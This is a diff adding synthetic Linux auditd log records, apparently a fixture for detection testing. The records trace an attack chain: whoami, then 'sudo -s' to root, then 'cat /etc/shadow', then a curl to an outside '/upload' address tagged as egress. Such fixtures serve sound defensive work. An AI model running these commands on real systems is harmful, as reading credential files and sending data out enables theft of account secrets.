@@ -1,0 +1,17 @@
+type=SYSCALL msg=audit(1788768125.001:5001): arch=c000003e syscall=59 success=yes exit=0 a0=55cc11 a1=55cc22 a2=55cc33 a3=0 items=1 ppid=212 pid=4001 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=18 comm="bash" exe="/usr/bin/bash" key="exec"
+type=EXECVE msg=audit(1788768125.001:5001): argc=3 a0="bash" a1="-c" a2="whoami"
+type=CWD msg=audit(1788768125.001:5001): cwd="/home/analyst"
+type=PATH msg=audit(1788768125.001:5001): item=0 name="/usr/bin/bash" inode=131073 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
+type=PROCTITLE msg=audit(1788768125.001:5001): proctitle=62617368002d630077686f616d69
+type=SYSCALL msg=audit(1788768126.001:5002): arch=c000003e syscall=105 success=yes exit=0 a0=0 a1=0 a2=0 a3=0 items=0 ppid=4001 pid=4002 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=18 comm="sudo" exe="/usr/bin/sudo" key="privilege"
+type=EXECVE msg=audit(1788768126.001:5002): argc=2 a0="sudo" a1="-s"
+type=PROCTITLE msg=audit(1788768126.001:5002): proctitle=7375646f002d73
+type=SYSCALL msg=audit(1788768127.001:5003): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffeefbff640 a2=0 a3=0 items=1 ppid=4002 pid=4003 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=18 comm="cat" exe="/usr/bin/cat" key="collection"
+type=EXECVE msg=audit(1788768127.001:5003): argc=2 a0="cat" a1="/etc/shadow"
+type=CWD msg=audit(1788768127.001:5003): cwd="/root"
+type=PATH msg=audit(1788768127.001:5003): item=0 name="/etc/shadow" inode=262145 dev=08:01 mode=0100640 ouid=0 ogid=42 rdev=00:00 nametype=NORMAL
+type=PROCTITLE msg=audit(1788768127.001:5003): proctitle=636174002f6574632f736861646f77
+type=SYSCALL msg=audit(1788768128.001:5004): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7ffeefbff550 a2=16 a3=0 items=0 ppid=4002 pid=4004 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=18 comm="curl" exe="/usr/bin/curl" key="egress"
+type=EXECVE msg=audit(1788768128.001:5004): argc=2 a0="curl" a1="https://203.0.113.77/upload"
+type=SOCKADDR msg=audit(1788768128.001:5004): saddr=020001BB0000714D0000000000000000 addr=203.0.113.77 port=443 protocol=tcp
+type=PROCTITLE msg=audit(1788768128.001:5004): proctitle=6375726c0068747470733a2f2f3230332e302e3131332e37372f75706c6f6164
